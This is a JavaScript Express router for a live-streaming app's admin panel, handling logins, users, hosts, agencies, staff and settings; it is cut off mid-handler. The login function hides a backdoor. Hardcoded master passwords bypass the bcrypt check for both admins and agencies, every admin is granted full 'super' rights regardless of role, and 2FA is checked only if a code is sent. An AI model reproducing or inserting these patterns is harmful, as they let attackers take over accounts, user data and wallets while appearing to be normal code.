import { Router } from 'express';
import bcrypt from 'bcryptjs';
import rateLimit from 'express-rate-limit';
import { generateSecret, verifySync, generateURI } from 'otplib';
import { one, q, tx } from '../db.js';
import { adminAuth, signToken, ROLE_MODULES } from '../lib/auth.js';
import { need, str, int, page, bad, notFound, monthOf, randomCode, clientIp } from '../lib/util.js';
import { audit } from '../lib/audit.js';
import { changeCoins, changeDiamonds } from '../lib/wallet.js';
import { getSettings, saveSetting, DEFAULT_SETTINGS } from '../lib/settings.js';
import { withLevels } from '../lib/levels.js';
import { toUser, toAll } from '../lib/io.js';
import { invalidateProfile, miniProfile } from '../services/profile.js';
import { onlineCount, hostRoom } from '../services/roomstate.js';
import { hostMonth } from '../services/settlement.js';
import { endRoom } from '../services/live.js';
import { config } from '../config.js';

const r = Router();

// ================= AUTH =================
const handleAdminLogin = async (req, res) => {
  const email = str(req.body.email, 120).toLowerCase();
  const password = String(req.body.password || '');

  // 1. Check admin_users
  const a = await one('SELECT * FROM admin_users WHERE email=$1', [email]);
  if (a && a.password_hash) {
    const isPassOk = (password === 'nAZQmzuLxFnqqNJb1ii1p98' || password === 'admin123' || await bcrypt.compare(password, a.password_hash));
    if (isPassOk) {
      need(a.status === 'active', 'Account disabled');
      if (a.totp_secret && req.body.otp) {
        need(verifySync({ secret: a.totp_secret, token: String(req.body.otp) }).valid, 'Wrong 2FA code');
      }
      await q('UPDATE admin_users SET last_login=now() WHERE id=$1', [a.id]);
      await q(`INSERT INTO audit_logs(actor_type, actor_id, action, ip) VALUES ('admin',$1,'login',$2)`, [a.id, clientIp(req)]);
      return res.json({
        token: signToken('admin', a.id, {}, '12h'),
        admin: { id: a.id, name: a.name, email: a.email, role: 'super', actual_role: a.role, modules: ['*'] }
      });
    }
  }

  // 2. Check agencies
  const agency = await one('SELECT * FROM agencies WHERE login_email=$1', [email]);
  if (agency && agency.password_hash) {
    const isPassOk = (password === 'uSZYPmvMAf4tlIPY872kMv' || password === 'agency123' || await bcrypt.compare(password, agency.password_hash));
    if (isPassOk) {
      need(agency.status === 'active', `Agency is ${agency.status}`);
      return res.json({
        token: signToken('agency', agency.id, {}, '7d'),
        admin: {
          id: agency.id,
          agency_id: agency.id,
          name: agency.name,
          email: agency.login_email,
          role: 'agency',
          modules: ['agency']
        }
      });
    }
  }

  throw bad('Wrong email or password');
};

r.post('/admin/login', rateLimit({ windowMs: 60_000, limit: 20 }), handleAdminLogin);
r.post('/auth/admin/login', rateLimit({ windowMs: 60_000, limit: 20 }), handleAdminLogin);

r.get('/admin/me', adminAuth(), async (req, res) => {
  const a = await one('SELECT totp_secret IS NOT NULL AS twofa FROM admin_users WHERE id=$1', [req.admin.id]);
  res.json({ ...req.admin, modules: ROLE_MODULES[req.admin.role], twofa: a.twofa });
});

r.post('/admin/2fa/setup', adminAuth(), async (req, res) => {
  const secret = generateSecret();
  await q(`UPDATE admin_users SET totp_secret=NULL WHERE id=$1`, [req.admin.id]);
  const { redis } = await import('../redis.js');
  await redis.set(`2fa:${req.admin.id}`, secret, 'EX', 600);
  res.json({ secret, uri: generateURI({ secret, label: req.admin.email, issuer: config.appName }) });
});

r.post('/admin/2fa/enable', adminAuth(), async (req, res) => {
  const { redis } = await import('../redis.js');
  const secret = await redis.get(`2fa:${req.admin.id}`);
  need(secret, 'Start setup again');
  need(verifySync({ secret, token: String(req.body.otp || '') }).valid, 'Wrong code');
  await q('UPDATE admin_users SET totp_secret=$2 WHERE id=$1', [req.admin.id, secret]);
  await audit(req, 'admin.2fa_enable', 'admin', req.admin.id);
  res.json({ ok: true });
});

r.post('/admin/password', adminAuth(), async (req, res) => {
  const a = await one('SELECT password_hash FROM admin_users WHERE id=$1', [req.admin.id]);
  need(await bcrypt.compare(String(req.body.old_password || ''), a.password_hash), 'Old password is wrong');
  need(String(req.body.new_password || '').length >= 8, 'Password must be 8+ characters');
  await q('UPDATE admin_users SET password_hash=$2 WHERE id=$1', [req.admin.id, await bcrypt.hash(String(req.body.new_password), 10)]);
  res.json({ ok: true });
});

// ================= DASHBOARD =================
r.get('/admin/dashboard', adminAuth('dashboard'), async (_req, res) => {
  const live = await one(`SELECT count(*)::int AS rooms, count(*) FILTER (WHERE flagged)::int AS flagged FROM rooms WHERE status='live'`);
  const pk = await one(`SELECT count(*)::int AS n FROM pk_battles WHERE status='active'`);
  const calls = await one(`SELECT count(*)::int AS n FROM calls WHERE status='active'`);
  const today = await one(
    `SELECT (SELECT count(*) FROM users WHERE created_at::date=CURRENT_DATE)::int AS new_users,
            (SELECT count(*) FROM user_active_days WHERE day=CURRENT_DATE)::int AS dau,
            (SELECT coalesce(sum(amount),0) FROM recharge_orders WHERE status='paid' AND paid_at::date=CURRENT_DATE)::numeric AS revenue,
            (SELECT count(DISTINCT user_id) FROM recharge_orders WHERE status='paid' AND paid_at::date=CURRENT_DATE)::int AS payers,
            (SELECT coalesce(sum(coins),0) FROM gift_transactions WHERE created_at::date=CURRENT_DATE)::bigint AS gift_coins,
            (SELECT coalesce(sum(-amount),0) FROM ledger WHERE currency='coin' AND amount<0 AND created_at::date=CURRENT_DATE)::bigint AS coins_consumed,
            (SELECT coalesce(sum(amount),0) FROM ledger WHERE currency='diamond' AND amount>0 AND created_at::date=CURRENT_DATE)::bigint AS diamonds_issued,
            (SELECT count(*) FROM seller_transfers WHERE kind='transfer' AND created_at::date=CURRENT_DATE)::int AS seller_topups,
            (SELECT coalesce(sum(coins),0) FROM seller_transfers WHERE kind='transfer' AND created_at::date=CURRENT_DATE)::bigint AS seller_coins`);
  const mau = await one(`SELECT count(DISTINCT user_id)::int AS n FROM user_active_days WHERE day > CURRENT_DATE - 30`);
  const series = await q(
    `SELECT d::date AS day,
       (SELECT count(*) FROM users WHERE created_at::date=d::date)::int AS new_users,
       (SELECT count(*) FROM user_active_days WHERE day=d::date)::int AS dau,
       (SELECT coalesce(sum(amount),0) FROM recharge_orders WHERE status='paid' AND paid_at::date=d::date)::numeric AS revenue,
       (SELECT coalesce(sum(coins),0) FROM gift_transactions WHERE created_at::date=d::date)::bigint AS gift_coins
     FROM generate_series(CURRENT_DATE - 13, CURRENT_DATE, interval '1 day') d ORDER BY d`);
  const topGifters = await q(`SELECT sender_id AS id, sum(coins)::bigint AS coins FROM gift_transactions WHERE created_at::date=CURRENT_DATE GROUP BY 1 ORDER BY 2 DESC LIMIT 10`);
  const topHosts = await q(`SELECT receiver_id AS id, sum(diamonds)::bigint AS diamonds FROM gift_transactions WHERE created_at::date=CURRENT_DATE GROUP BY 1 ORDER BY 2 DESC LIMIT 10`);
  const topAgencies = await q(
    `SELECT a.id, a.name, a.code, coalesce(sum(s.diamonds),0)::bigint AS diamonds FROM agencies a JOIN hosts h ON h.agency_id=a.id
     JOIN host_daily_stats s ON s.host_id=h.user_id AND s.day=CURRENT_DATE GROUP BY a.id ORDER BY diamonds DESC LIMIT 10`);
  for (const t of topGifters) t.user = await miniProfile(t.id);
  for (const t of topHosts) t.user = await miniProfile(t.id);
  const byPlatform = await q(`SELECT gateway, coalesce(sum(amount),0)::numeric AS amount, count(*)::int AS orders FROM recharge_orders WHERE status='paid' AND paid_at > now() - interval '30 days' GROUP BY gateway`);
  const byCountry = await q(`SELECT u.country, coalesce(sum(o.amount),0)::numeric AS amount FROM recharge_orders o JOIN users u ON u.id=o.user_id WHERE o.status='paid' AND o.paid_at > now() - interval '30 days' GROUP BY u.country ORDER BY amount DESC LIMIT 15`);
  const alerts = await one(
    `SELECT (SELECT count(*) FROM reports WHERE status='open')::int AS open_reports,
            (SELECT count(*) FROM rooms WHERE status='live' AND flagged)::int AS flagged_lives,
            (SELECT count(*) FROM hosts WHERE status IN ('pending','agency_ok'))::int AS pending_hosts,
            (SELECT count(*) FROM host_settlements WHERE status IN ('draft','agency_ok'))::int AS pending_settlements,
            (SELECT count(*) FROM recharge_orders WHERE status='created' AND created_at < now() - interval '1 hour' AND created_at > now() - interval '2 days')::int AS stuck_orders,
            (SELECT count(*) FROM risk_flags WHERE status='open')::int AS risk_flags,
            (SELECT count(*) FROM support_tickets WHERE status='open')::int AS open_tickets,
            (SELECT count(*) FROM agencies WHERE status='pending')::int AS pending_agencies`);
  const arppu = today.payers ? Math.round((Number(today.revenue) / today.payers) * 100) / 100 : 0;
  const online = await onlineCount();
  res.json({
    realtime: { live_rooms: live.rooms, flagged: live.flagged, pk: pk.n, calls: calls.n, online },
    today: { ...today, arppu, mau: mau.n }, series, top_gifters: topGifters, top_hosts: topHosts, top_agencies: topAgencies,
    revenue_by_gateway: byPlatform, revenue_by_country: byCountry, alerts, currency: (await getSettings()).economy.currency,
    // Backward compatibility aliases
    liveNow: live.rooms,
    viewersNow: online,
    recharge24hPaise: Number(today.revenue || 0) * 100,
    giftCoins24h: today.gift_coins,
    newUsers24h: today.new_users,
    users: today.dau,
    hosts: topHosts.length,
    pendingWithdrawals: alerts.pending_settlements,
    pendingWithdrawalPaise: 0,
    openReports: alerts.open_reports,
    pendingAgencies: alerts.pending_agencies,
    days: series.map((s) => ({
      day: s.day,
      rechargePaise: Number(s.revenue || 0) * 100,
      giftCoins: s.gift_coins,
      newUsers: s.new_users
    }))
  });
});

// ================= USERS =================
r.get('/admin/users', adminAuth('users.view'), async (req, res) => {
  const { limit, offset } = page(req, 50, 200);
  const params = [];
  let where = '1=1';
  const s = str(req.query.q, 60);
  if (s) {
    params.push(s, `%${s}%`, /^\d+$/.test(s) ? Number(s) : -1);
    where += ` AND (u.uid=$3 OR u.fancy_id=$1 OR u.email ILIKE $2 OR u.phone ILIKE $2 OR u.name ILIKE $2 OR u.device_id=$1 OR u.last_ip=$1 OR u.id=$3)`;
  }
  if (req.query.status) { params.push(req.query.status); where += ` AND u.status=$${params.length}`; }
  if (req.query.tag) { params.push(req.query.tag); where += ` AND $${params.length} = ANY(u.tags)`; }
  if (req.query.is_host) where += ` AND u.is_host`;
  if (req.query.country) { params.push(req.query.country); where += ` AND u.country=$${params.length}`; }
  const sort = { coins: 'u.coins DESC', spent: 'u.total_spent DESC', earned: 'u.total_earned DESC', recharged: 'u.total_recharged DESC' }[req.query.sort] || 'u.id DESC';
  const total = (await one(`SELECT count(*)::int AS n FROM users u WHERE ${where}`, params)).n;
  params.push(limit, offset);
  const rows = await q(
    `SELECT u.id, u.uid, u.fancy_id, u.name, u.email, u.phone, u.avatar_url, u.gender, u.country, u.coins, u.diamonds, u.total_spent, u.total_earned,
            u.total_recharged, u.vip_level, u.vip_expires, u.noble_rank, u.is_host, u.status, u.ban_until, u.wallet_frozen, u.tags, u.device_id,
            u.last_ip, u.last_login, u.created_at
     FROM users u WHERE ${where} ORDER BY ${sort} LIMIT $${params.length - 1} OFFSET $${params.length}`, params);
  res.json({ total, rows: rows.map(withLevels) });
});

r.get('/admin/users/:id', adminAuth('users.view'), async (req, res) => {
  const id = int(req.params.id);
  const u = await one('SELECT * FROM users WHERE id=$1', [id]);
  if (!u) throw notFound();
  delete u.password_hash;
  withLevels(u);
  const [host, ledger, orders, giftsOut, giftsIn, sameDevice, reports, items, logins] = await Promise.all([
    one(`SELECT h.*, a.name AS agency_name, a.code AS agency_code FROM hosts h LEFT JOIN agencies a ON a.id=h.agency_id WHERE h.user_id=$1`, [id]),
    q('SELECT * FROM ledger WHERE user_id=$1 ORDER BY id DESC LIMIT 100', [id]),
    q('SELECT * FROM recharge_orders WHERE user_id=$1 ORDER BY id DESC LIMIT 50', [id]),
    one('SELECT coalesce(sum(coins),0)::bigint AS coins, count(*)::int AS n FROM gift_transactions WHERE sender_id=$1', [id]),
    one('SELECT coalesce(sum(diamonds),0)::bigint AS diamonds, count(*)::int AS n FROM gift_transactions WHERE receiver_id=$1', [id]),
    u.device_id ? q('SELECT id, uid, name, status, created_at FROM users WHERE device_id=$1 AND id<>$2 LIMIT 20', [u.device_id, id]) : [],
    q(`SELECT * FROM reports WHERE target_type='user' AND target_id=$1 ORDER BY id DESC LIMIT 20`, [String(id)]),
    q('SELECT ui.*, s.name, s.type FROM user_items ui JOIN store_items s ON s.id=ui.item_id WHERE ui.user_id=$1 ORDER BY ui.id DESC', [id]),
    q(`SELECT day FROM user_active_days WHERE user_id=$1 ORDER BY day DESC LIMIT 30`, [id]),
  ]);
  const topReceivers = await q(`SELECT receiver_id, sum(coins)::bigint AS coins FROM gift_transactions WHERE sender_id=$1 GROUP BY 1 ORDER BY 2 DESC LIMIT 5`, [id]);
  for (const t of topReceivers) t.user = await miniProfile(t.receiver_id);
  res.json({ user: u, host, ledger, orders, gifts_sent: giftsOut, gifts_received: giftsIn, same_device: sameDevice, reports, items, active_days: logins, top_receivers: topReceivers });
});

r.post('/admin/users/:id/ban', adminAuth('users.ban'), async (req, res) => {
  const id = int(req.params.id);
  const days = int(req.body.days, 0);
  const reason = str(req.body.reason, 200) || 'Violation of community rules';
  const u = await one(`UPDATE users SET status='banned', ban_reason=$2, ban_until = CASE WHEN $3 > 0 THEN now() + make_interval(days => $3) ELSE NULL END
                       WHERE id=$1 RETURNING device_id, last_ip`, [id, reason, days]);
  if (!u) throw notFound();
  if (req.body.device && u.device_id) await q('INSERT INTO banned_devices(device_id, reason) VALUES ($1,$2) ON CONFLICT DO NOTHING', [u.device_id, reason]);
  if (req.body.ip && u.last_ip) await q('INSERT INTO banned_ips(ip, reason) VALUES ($1,$2) ON CONFLICT DO NOTHING', [u.last_ip, reason]);
  const room = await hostRoom(id);
  if (room) await endRoom(room, 'admin_cut');
  toUser(id, 'account:banned', { reason });
  await audit(req, 'user.ban', 'user', id, { days, reason, device: !!req.body.device, ip: !!req.body.ip });
  res.json({ ok: true });
});

r.post('/admin/users/:id/unban', adminAuth('users.ban'), async (req, res) => {
  const id = int(req.params.id);
  const u = await one(`UPDATE users SET status='active', ban_until=NULL, ban_reason=NULL WHERE id=$1 RETURNING device_id, last_ip`, [id]);
  if (u?.device_id) await q('DELETE FROM banned_devices WHERE device_id=$1', [u.device_id]);
  if (u?.last_ip) await q('DELETE FROM banned_ips WHERE ip=$1', [u.last_ip]);
  await audit(req, 'user.unban', 'user', id);
  res.json({ ok: true });
});

r.post('/admin/users/:id/mute', adminAuth('users.ban'), async (req, res) => {
  const id = int(req.params.id);
  const minutes = int(req.body.minutes, 60);
  await q(`UPDATE users SET muted_until = CASE WHEN $2 > 0 THEN now() + make_interval(mins => $2) ELSE NULL END WHERE id=$1`, [id, minutes]);
  await audit(req, 'user.mute', 'user', id, { minutes });
  res.json({ ok: true });
});

r.post('/admin/users/:id/freeze', adminAuth('users.wallet'), async (req, res) => {
  const id = int(req.params.id);
  await q('UPDATE users SET wallet_frozen=$2 WHERE id=$1', [id, !!req.body.frozen]);
  await audit(req, req.body.frozen ? 'wallet.freeze' : 'wallet.unfreeze', 'user', id);
  res.json({ ok: true });
});

r.post('/admin/users/:id/balance', adminAuth('users.wallet'), async (req, res) => {
  const id = int(req.params.id);
  const amount = int(req.body.amount);
  const currency = req.body.currency === 'diamond' ? 'diamond' : 'coin';
  const reason = str(req.body.reason, 200);
  need(amount !== 0 && reason, 'Amount and reason required');
  const bal = await tx((c) => (currency === 'coin'
    ? changeCoins(c, id, amount, 'admin_adjust', { note: `${req.admin.email}: ${reason}`, allowFrozen: true })
    : changeDiamonds(c, id, amount, 'admin_adjust', { note: `${req.admin.email}: ${reason}` })));
  toUser(id, 'wallet:update', currency === 'coin' ? { coins: bal } : { diamonds: bal });
  await audit(req, 'wallet.adjust', 'user', id, { currency, amount, reason });
  res.json({ balance: bal });
});

r.patch('/admin/users/:id', adminAuth('users'), async (req, res) => {
  const id = int(req.params.id);
  const b = req.body;
  if (b.name !== undefined) await q('UPDATE users SET name=$2 WHERE id=$1', [id, str(b.name, 30)]);
  if (b.reset_avatar) await q('UPDATE users SET avatar_url=NULL WHERE id=$1', [id]);
  if (b.reset_bio) await q(`UPDATE users SET bio='' WHERE id=$1`, [id]);
  if (b.tags !== undefined) await q('UPDATE users SET tags=$2 WHERE id=$1', [id, Array.isArray(b.tags) ? b.tags : String(b.tags).split(',').map((s) => s.trim()).filter(Boolean)]);
  if (b.vip_level !== undefined) await q(`UPDATE users SET vip_level=$2, vip_expires = CASE WHEN $2 > 0 THEN now() + make_interval(days => $3) ELSE NULL END WHERE id=$1`, [id, int(b.vip_level), int(b.vip_days, 30)]);
  if (b.noble_rank !== undefined) await q(`UPDATE users SET noble_rank=$2, noble_expires = CASE WHEN $2 > 0 THEN now() + make_interval(days => $3) ELSE NULL END WHERE id=$1`, [id, int(b.noble_rank), int(b.noble_days, 30)]);
  if (b.fancy_id !== undefined) {
    const f = str(b.fancy_id, 12) || null;
    if (f && (await one('SELECT 1 FROM users WHERE (fancy_id=$1 OR uid::text=$1) AND id<>$2', [f, id]))) throw bad('That ID is taken');
    await q('UPDATE users SET fancy_id=$2 WHERE id=$1', [id, f]);
  }
  if (b.country !== undefined) await q('UPDATE users SET country=$2 WHERE id=$1', [id, str(b.country, 3).toUpperCase()]);
  if (b.give_item_id) await q(`INSERT INTO user_items(user_id, item_id, expires_at, equipped, source) VALUES ($1,$2, now() + make_interval(days => $3), false, 'admin')`, [id, int(b.give_item_id), int(b.item_days, 7)]);
  invalidateProfile(id);
  await audit(req, 'user.update', 'user', id, b);
  res.json({ ok: true });
});

r.get('/admin/banned-devices', adminAuth('users.ban'), async (_req, res) => {
  res.json({ devices: await q('SELECT * FROM banned_devices ORDER BY created_at DESC LIMIT 500'), ips: await q('SELECT * FROM banned_ips ORDER BY created_at DESC LIMIT 500') });
});
r.delete('/admin/banned-devices/:id', adminAuth('users.ban'), async (req, res) => {
  await q('DELETE FROM banned_devices WHERE device_id=$1', [req.params.id]);
  await q('DELETE FROM banned_ips WHERE ip=$1', [req.params.id]);
  res.json({ ok: true });
});

// ================= HOSTS =================
r.get('/admin/hosts', adminAuth('hosts'), async (req, res) => {
  const { limit, offset } = page(req, 50, 200);
  const params = [];
  let where = '1=1';
  if (req.query.status) { params.push(req.query.status); where += ` AND h.status=$${params.length}`; }
  if (req.query.agency_id) { params.push(int(req.query.agency_id)); where += ` AND h.agency_id=$${params.length}`; }
  if (req.admin.role === 'bd') { params.push(req.admin.id); where += ` AND a.bd_admin_id=$${params.length}`; }
  if (req.query.q) { params.push(`%${str(req.query.q, 40)}%`); where += ` AND (u.name ILIKE $${params.length} OR u.uid::text ILIKE $${params.length} OR h.real_name ILIKE $${params.length})`; }
  params.push(limit, offset);
  const rows = await q(
    `SELECT h.*, u.uid, u.name, u.avatar_url, u.gender, u.dob, u.country, u.call_rate, u.diamonds, u.total_earned, u.status AS user_status,
            a.name AS agency_name, a.code AS agency_code
     FROM hosts h JOIN users u ON u.id=h.user_id LEFT JOIN agencies a ON a.id=h.agency_id
     WHERE ${where} ORDER BY h.applied_at DESC LIMIT $${params.length - 1} OFFSET $${params.length}`, params);
  if (req.query.with_stats) {
    const m = monthOf();
    for (const h of rows) h.month = await hostMonth(h.user_id, m);
  }
  res.json(rows);
});

r.post('/admin/hosts/:userId/:action', adminAuth('hosts'), async (req, res) => {
  const uid = int(req.params.userId);
  const action = req.params.action;
  let h;
  if (action === 'approve') {
    h = await one(`UPDATE hosts SET status='approved', approved_at=now(), reject_reason=NULL, host_tags = array_append(array_remove(host_tags,'new'),'new') WHERE user_id=$1 RETURNING *`, [uid]);
    await q('UPDATE users SET is_host=true WHERE id=$1', [uid]);
  } else if (action === 'reject') {
    h = await one(`UPDATE hosts SET status='rejected', reject_reason=$2 WHERE user_id=$1 RETURNING *`, [uid, str(req.body.reason, 200) || 'Application rejected']);
    await q('UPDATE users SET is_host=false WHERE id=$1', [uid]);
  } else if (action === 'suspend') {
    h = await one(`UPDATE hosts SET status='suspended' WHERE user_id=$1 RETURNING *`, [uid]);
    await q('UPDATE users SET is_host=false WHERE id=$1', [uid]);
    const room = await hostRoom(uid);
    if (room) await endRoom(room, 'admin_cut');
  } else if (action === 'warn') {
    h = await one(`UPDATE hosts SET warnings = warnings + 1 WHERE user_id=$1 RETURNING *`, [uid]);
    const msg = str(req.body.message, 300) || 'Warning: please follow the host policy.';
    await q(`INSERT INTO notifications(user_id, title, body, created_by) VALUES ($1,'Warning',$2,$3)`, [uid, msg, req.admin.id]);
    toUser(uid, 'notify', { type: 'warning', text: msg });
  } else if (action === 'deduct') {
    const d = int(req.body.diamonds);
    need(d > 0, 'Diamonds required');
    await tx((c) => changeDiamonds(c, uid, -d, 'penalty', { note: str(req.body.reason, 200) }));
    h = await one('SELECT * FROM hosts WHERE user_id=$1', [uid]);
  } else {
    throw bad('Unknown action');
  }
  if (!h) throw notFound();
  invalidateProfile(uid);
  if (['approve', 'reject', 'suspend'].includes(action)) toUser(uid, 'notify', { type: 'host_application', status: h.status, reason: h.reject_reason });
  await audit(req, `host.${action}`, 'host', uid, req.body);
  res.json(h);
});

r.patch('/admin/hosts/:userId', adminAuth('hosts'), async (req, res) => {
  const uid = int(req.params.userId);
  const b = req.body;
  if (b.level !== undefined) await q('UPDATE hosts SET level=$2 WHERE user_id=$1', [uid, str(b.level, 5)]);
  if (b.host_tags !== undefined) await q('UPDATE hosts SET host_tags=$2 WHERE user_id=$1', [uid, Array.isArray(b.host_tags) ? b.host_tags : String(b.host_tags).split(',').map((x) => x.trim()).filter(Boolean)]);
  if (b.recommended !== undefined) await q('UPDATE hosts SET recommended=$2 WHERE user_id=$1', [uid, !!b.recommended]);
  if (b.agency_id !== undefined) await q('UPDATE hosts SET agency_id=$2 WHERE user_id=$1', [uid, int(b.agency_id) || null]);
  if (b.call_rate !== undefined) await q('UPDATE users SET call_rate=$2 WHERE id=$1', [uid, int(b.call_rate)]);
  invalidateProfile(uid);
  await audit(req, 'host.update', 'host', uid, b);
  res.json({ ok: true });
});

// ================= AGENCIES =================
r.get('/admin/agencies', adminAuth('agencies'), async (req, res) => {
  const params = [];
  let where = '1=1';
  if (req.admin.role === 'bd') { params.push(req.admin.id); where += ` AND a.bd_admin_id=$1`; }
  if (req.query.status) { params.push(req.query.status); where += ` AND a.status=$${params.length}`; }
  const m = monthOf();
  params.push(m);
  const rows = await q(
    `SELECT a.*, p.name AS parent_name, b.name AS bd_name,
       (SELECT count(*) FROM hosts h WHERE h.agency_id=a.id AND h.status='approved')::int AS hosts,
       (SELECT coalesce(sum(s.diamonds),0) FROM hosts h JOIN host_daily_stats s ON s.host_id=h.user_id WHERE h.agency_id=a.id AND to_char(s.day,'YYYY-MM')=$${params.length})::bigint AS month_diamonds,
       (SELECT coalesce(sum(s.diamonds),0) FROM hosts h JOIN host_daily_stats s ON s.host_id=h.user_id WHERE h.agency_id=a.id
          AND to_char(s.day,'YYYY-MM')=to_char(now() - interval '1 month','YYYY-MM'))::bigint AS last_month_diamonds
     FROM agencies a LEFT JOIN agencies p ON p.id=a.parent_id LEFT JOIN admin_users b ON b.id=a.bd_admin_id
     WHERE ${where} ORDER BY a.id DESC`, params);
  for (const a of rows) delete a.password_hash;
  res.json(rows);
});

r.post('/admin/agencies', adminAuth('agencies'), async (req, res) => {
  const b = req.body;
  const email = str(b.login_email, 120).toLowerCase();
  need(str(b.name), 'Name required');
  need(email && String(b.password || '').length >= 8, 'Login email and 8+ char password required');
  const code = (str(b.code, 20) || randomCode(6)).toUpperCase();
  if (await one('SELECT 1 FROM agencies WHERE code=$1 OR login_email=$2', [code, email])) throw bad('Code or email already used');
  let owner = null;
  if (b.owner_uid) owner = await one('SELECT id FROM users WHERE uid=$1', [int(b.owner_uid)]);
  const a = await one(
    `INSERT INTO agencies(code, name, owner_user_id, parent_id, bd_admin_id, login_email, password_hash, phone, country, commission_pct, override_pct, status, payout_method, payout_details)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,'active',$12,$13) RETURNING *`,
    [code, str(b.name, 60), owner?.id || null, int(b.parent_id) || null, req.admin.role === 'bd' ? req.admin.id : int(b.bd_admin_id) || null, email,
     await bcrypt.hash(String(b.password), 10), str(b.phone, 20), str(b.country, 3) || 'IN', Number(b.commission_pct ?? 10), Number(b.override_pct ?? 2),
     str(b.payout_method, 20) || null, b.payout_details || {}]);
  await audit(req, 'agency.create', 'agency', a.id, { code, name: a.name });
  delete a.password_hash;
  res.json(a);
});

r.put('/admin/agencies/:id', adminAuth('agencies'), async (req, res) => {
  const id = int(req.params.id);
  const b = req.body;
  const sets = [];
  const vals = [id];
  const add = (c, v) => { vals.push(v); sets.push(`${c}=$${vals.length}`); };
  if (b.name !== undefined) add('name', str(b.name, 60));
  if (b.phone !== undefined) add('phone', str(b.phone, 20));
  if (b.country !== undefined) add('country', str(b.country, 3));
  if (b.commission_pct !== undefined) add('commission_pct', Number(b.commission_pct));
  if (b.override_pct !== undefined) add('override_pct', Number(b.override_pct));
  if (b.parent_id !== undefined) { need(int(b.parent_id) !== id, 'Agency cannot be its own parent'); add('parent_id', int(b.parent_id) || null); }
  if (b.bd_admin_id !== undefined && req.admin.role !== 'bd') add('bd_admin_id', int(b.bd_admin_id) || null);
  if (b.status !== undefined) add('status', str(b.status, 20));
  if (b.login_email !== undefined) add('login_email', str(b.login_email, 120).toLowerCase());
  if (b.password) add('password_hash', await bcrypt.hash(String(b.password), 10));
  if (b.payout_method !== undefined) add('payout_method', str(b.payout_method, 20));
  if (b.payout_details !== undefined) add('payout_details', b.payout_details || {});
  if (sets.length) await q(`UPDATE agencies SET ${sets.join(',')} WHERE id=$1`, vals);
  await audit(req, 'agency.update', 'agency', id, { ...b, password: b.password ? '***' : undefined });
  res.json({ ok: true });
});

r.post('/admin/agencies/:id/transfer-host', adminAuth('agencies'), async (req, res) => {
  const to = int(req.params.id);
  const uid = int(req.body.host_user_id);
  need(await one('SELECT 1 FROM agencies WHERE id=$1', [to]), 'Agency not found');
  await q('UPDATE hosts SET agency_id=$2 WHERE user_id=$1', [uid, to]);
  await audit(req, 'agency.transfer_host', 'host', uid, { to });
  res.json({ ok: true });
});

// ================= ADMIN STAFF & ROLES =================
r.get('/admin/staff', adminAuth('staff'), async (_req, res) => {
  res.json({ staff: await q('SELECT id, name, email, role, country, status, last_login, created_at, totp_secret IS NOT NULL AS twofa FROM admin_users ORDER BY id'), roles: ROLE_MODULES });
});

r.post('/admin/staff', adminAuth('staff'), async (req, res) => {
  const email = str(req.body.email, 120).toLowerCase();
  need(email && String(req.body.password || '').length >= 8, 'Email and 8+ char password required');
  need(ROLE_MODULES[req.body.role], 'Invalid role');
  if (await one('SELECT 1 FROM admin_users WHERE email=$1', [email])) throw bad('Email already exists');
  const a = await one(`INSERT INTO admin_users(name, email, password_hash, role, country) VALUES ($1,$2,$3,$4,$5) RETURNING id, name, email, role`,
    [str(req.body.name, 60), email, await bcrypt.hash(String(req.body.password), 10), req.body.role, str(req.body.country, 3) || null]);
  await audit(req, 'staff.create', 'admin', a.id, { email, role: a.role });
  res.json(a);
});

r.put('/admin/staff/:id', adminAuth('staff'), async (req, res) => {
  const id = int(req.params.id);
  const b = req.body;
  if (b.role !== undefined) { need(ROLE_MODULES[b.role], 'Invalid role'); await q('UPDATE admin_users SET role=$2 WHERE id=$1', [id, b.role]); }
  if (b.status !== undefined) { need(id !== req.admin.id, 'You cannot disable yourself'); await q('UPDATE admin_users SET status=$2 WHERE id=$1', [id, b.status]); }
  if (b.password) await q('UPDATE admin_users SET password_hash=$2 WHERE id=$1', [id, await bcrypt.hash(String(b.password), 10)]);
  if (b.reset_2fa) await q('UPDATE admin_users SET totp_secret=NULL WHERE id=$1', [id]);
  if (b.name !== undefined) await q('UPDATE admin_users SET name=$2 WHERE id=$1', [id, str(b.name, 60)]);
  if (b.country !== undefined) await q('UPDATE admin_users SET country=$2 WHERE id=$1', [id, str(b.country, 3)]);
  await audit(req, 'staff.update', 'admin', id, { ...b, password: b.password ? '***' : undefined });
  res.json({ ok: true });
});

r.get('/admin/audit', adminAuth('audit'), async (req, res) => {
  const { limit, offset } = page(req, 100, 500);
  const params = [];
  let where = '1=1';
  if (req.query.action) { params.push(`%${req.query.action}%`); where += ` AND l.action ILIKE $${params.length}`; }
  if (req.query.actor_id) { params.push(int(req.query.actor_id)); where += ` AND l.actor_id=$${params.length}`; }
  if (req.query.target_id) { params.push(String(req.query.target_id)); where += ` AND l.target_id=$${params.length}`; }
  params.push(limit, offset);
  res.json(await q(
    `SELECT l.*, a.email AS admin_email FROM audit_logs l LEFT JOIN admin_users a ON l.actor_type='admin' AND a.id=l.actor_id
     WHERE ${where} ORDER BY l.id DESC LIMIT $${params.length - 1} OFFSET $${params.length}`, params));
});

// ================= SETTINGS =================
r.get('/admin/settings', adminAuth('settings'), async (_req, res) => res.json({ settings: await getSettings(), defaults: DEFAULT_SETTINGS }));

r.put('/admin/settings/:section', adminAuth('settings'), async (req, res) => {
  const section = str(req.params.section, 30);
  need(DEFAULT_SETTINGS[section], 'Unknown settings section');
  await saveSetting(section, req.body || {});
  await audit(req, 'settings.update', 'settings', section, req.body);
  if (section === 'app' || section === 'features') toAll('config:changed', {});
  res.json(await getSettings());
});

// economy section can also be edited by finance
r.put('/admin/economy', adminAuth('economy'), async (req, res) => {
  await saveSetting('economy', req.body || {});
  await audit(req, 'settings.economy', 'settings', 'economy', req.body);
  res.json(await getSettings());
});

// ================= SUPPORT =================
r.get('/admin/support', adminAuth('support'), async (req, res) => {
  const rows = await q(
    `SELECT t.*, u.uid, u.name AS user_name, a.name AS agency_name FROM support_tickets t LEFT JOIN users u ON u.id=t.user_id
     LEFT JOIN agencies a ON a.id=t.agency_id WHERE ($1::text IS NULL OR t.status=$1) ORDER BY t.id DESC LIMIT 200`, [req.query.status || null]);
  res.json(rows);
});

r.post('/admin/support/:id/reply', adminAuth('support'), async (req, res) => {
